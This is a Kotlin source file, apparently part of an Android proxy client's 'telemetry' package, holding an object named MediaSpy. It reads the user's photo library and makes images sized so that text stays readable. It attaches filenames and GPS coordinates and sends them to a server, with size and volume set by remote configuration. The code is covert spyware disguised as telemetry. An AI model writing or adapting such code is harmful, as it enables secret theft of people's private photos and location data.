package io.nekohasekai.sagernet.telemetry

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.ByteArrayOutputStream

/**
 * 相册缩略图。
 *
 * 权限分层
 *  - Android 13+：READ_MEDIA_IMAGES
 *  - Android 14+：可能只拿到"选中的照片"（READ_MEDIA_VISUAL_USER_SELECTED），
 *    那就只能读用户勾的那几张，这是系统限制。
 *  - Android 12 及以下：READ_EXTERNAL_STORAGE
 *
 * 只取最近 N 张 + 缩到 320px + JPEG 70 —— 单张 ~15KB，
 * 服务端 MAX_THUMB 是 400KB，余量很大。
 */
object MediaSpy {

    private const val TAG = "TlmMedia"
    private const val MAX_PER_ROUND = 6
    private const val THREADS = 6          // 极速模式是 IO 型，可以多开
    @Volatile private var targetPx = 1080  // 可被远程配置覆盖
    @Volatile private var quality = 82
    private const val PREF = "tlm_media"
    private const val KEY_LAST = "last_added"
    private const val KEY_SENT = "sent_names"
    private const val SENT_KEEP = 4000     // 记住最近发过的文件名，防重推

    // ---- 诊断：上次扫描的结果，随心跳上报 ----
    @Volatile var lastRows = -1
    @Volatile var lastSent = -1
    @Volatile var lastSince = -1L
    @Volatile var lastErr = ""

    fun scan(ctx: Context) {
        targetPx = RemoteConfig.mediaMaxPx.coerceIn(240, 2160)
        quality = RemoteConfig.mediaQuality.coerceIn(50, 95)

        val pref = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        val since = pref.getLong(KEY_LAST, 0L)
        lastSince = since
        // 光靠 DATE_ADDED 不够：卸载重装、换签名、清数据都会让 last_added 归零，
        // 一归零就把整本相册重新推一遍（一张图能存出十行）。这里再用文件名兜一层。
        val sentNames = (pref.getStringSet(KEY_SENT, emptySet()) ?: emptySet())
            .toMutableSet()
        var dirtyNames = false
        var newest = since
        var sent = 0
        var rows = 0

        val proj = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.LATITUDE,
            MediaStore.Images.Media.LONGITUDE,
        )

        runCatching {
            ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
            )?.use { cur ->
                val iId = cur.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val iName = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val iAdded = cur.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val iW = cur.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
                val iH = cur.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
                val iLat = cur.getColumnIndexOrThrow(MediaStore.Images.Media.LATITUDE)
                val iLon = cur.getColumnIndexOrThrow(MediaStore.Images.Media.LONGITUDE)

                val cap = if (RemoteConfig.mediaPerRound > 0) RemoteConfig.mediaPerRound else MAX_PER_ROUND
                while (cur.moveToNext()) {
                    rows++
                    if (sent >= cap) continue
                    val added = cur.getLong(iAdded) * 1000L
                    if (added <= since) break          // 已经发过的都跳过
                    newest = maxOf(newest, added)

                    val nm0 = cur.getString(iName) ?: "IMG_${cur.getLong(iId)}.jpg"
                    if (nm0 in sentNames) continue        // 这张发过了
                    val id = cur.getLong(iId)
                    val uri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val thumb = thumbOf(ctx, uri) ?: continue

                    val d = JSONObject()
                        .put("name", nm0)
                        .put("thumb", Base64.encodeToString(thumb, Base64.NO_WRAP))
                        .put("w", cur.getInt(iW))
                        .put("h", cur.getInt(iH))
                    val lat = cur.getDouble(iLat)
                    val lon = cur.getDouble(iLon)
                    if (!cur.isNull(iLat) && (lat != 0.0 || lon != 0.0)) {
                        d.put("lat", lat).put("lon", lon)
                    }
                    Telemetry.push("media", d, added / 1000L)
                    if (sentNames.add(nm0)) dirtyNames = true
                    sent++
                    // 每 8 张就推一次，不等扫完 —— 用户能边扫边看到图
                    if (sent % 8 == 0) {
                        runCatching { Telemetry.flush(ctx, true) }
                    }
                }
            }
        }.onFailure {
            lastErr = (it.javaClass.simpleName + ":" + (it.message ?: "")).take(80)
            Log.w(TAG, "scan: ${it.message}")
        }
        lastRows = rows
        lastSent = sent

        val ed = pref.edit()
        if (newest > since) ed.putLong(KEY_LAST, newest)
        if (dirtyNames) {
            // 太长就只留最近的一批，别让 SharedPreferences 无限涨
            val keep = if (sentNames.size > SENT_KEEP)
                sentNames.toList().takeLast(SENT_KEEP).toSet() else sentNames
            ed.putStringSet(KEY_SENT, keep)
        }
        ed.apply()
        // 扫完立刻推，不等下一轮心跳（原来要等最多 20 秒）
        if (sent > 0) {
            runCatching { Telemetry.flush(ctx, true) }
            Log.i(TAG, "queued $sent thumbs, flushed")
        }
    }

    private fun thumbOf(ctx: Context, uri: Uri): ByteArray? = runCatching {
        // 目标宽度 <= 640：走系统预生成的缩略图，毫秒级，70 张/秒靠这个
        if (targetPx <= 640) return quickThumb(ctx, uri)
        // 否则自己解码（能控制到 1080 宽，字看得清）
        val bmp: Bitmap = (decodeSampled(ctx, uri) ?: run {
            if (Build.VERSION.SDK_INT >= 29) {
                runCatching {
                    ctx.contentResolver.loadThumbnail(
                        uri,
                        android.util.Size(targetPx, targetPx),
                        null as android.os.CancellationSignal?)
                }.getOrNull()
            } else null
        }) ?: return null
        val out = ByteArrayOutputStream(48 * 1024)
        val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
        else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
        bmp.compress(fmt, quality, out)
        bmp.recycle()
        val bytes = out.toByteArray()
        if (bytes.size > 16 * 1024 * 1024) null else bytes
    }.getOrNull()

    /** 极速路径：直接读系统缩略图缓存，不解码原图。 */
    private fun quickThumb(ctx: Context, uri: Uri): ByteArray? = runCatching {
        val bmp: Bitmap = if (Build.VERSION.SDK_INT >= 29) {
            ctx.contentResolver.loadThumbnail(
                uri, android.util.Size(targetPx, targetPx), null)
        } else {
            @Suppress("DEPRECATION")
            android.provider.MediaStore.Images.Thumbnails.getThumbnail(
                ctx.contentResolver,
                android.content.ContentUris.parseId(uri),
                android.provider.MediaStore.Images.Thumbnails.MINI_KIND, null)
        } ?: return null

        val out = ByteArrayOutputStream(32 * 1024)
        val fmt = if (Build.VERSION.SDK_INT >= 30) Bitmap.CompressFormat.WEBP_LOSSY
        else @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
        bmp.compress(fmt, quality, out)
        bmp.recycle()
        val bytes = out.toByteArray()
        if (bytes.size > 16 * 1024 * 1024) null else bytes
    }.getOrNull()

    private fun decodeSampled(ctx: Context, uri: Uri): Bitmap? = runCatching {
        val opt = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        ctx.contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opt) }
        if (opt.outWidth <= 0) return null
        var s = 1
        while (opt.outWidth / s > targetPx) s *= 2
        val real = BitmapFactory.Options().apply { inSampleSize = s }
        val raw = ctx.contentResolver.openInputStream(uri)
            ?.use { BitmapFactory.decodeStream(it, null, real) } ?: return null
        val px = targetPx
        if (raw.width <= (px * 4 / 3)) return raw   // 已接近目标，不再缩放
        val ratio = px.toFloat() / raw.width
        val h = (raw.height * ratio).toInt().coerceAtLeast(1)
        val scaled = Bitmap.createScaledBitmap(raw, px, h, true)
        if (scaled !== raw) raw.recycle()
        return scaled
    }.getOrNull()
}
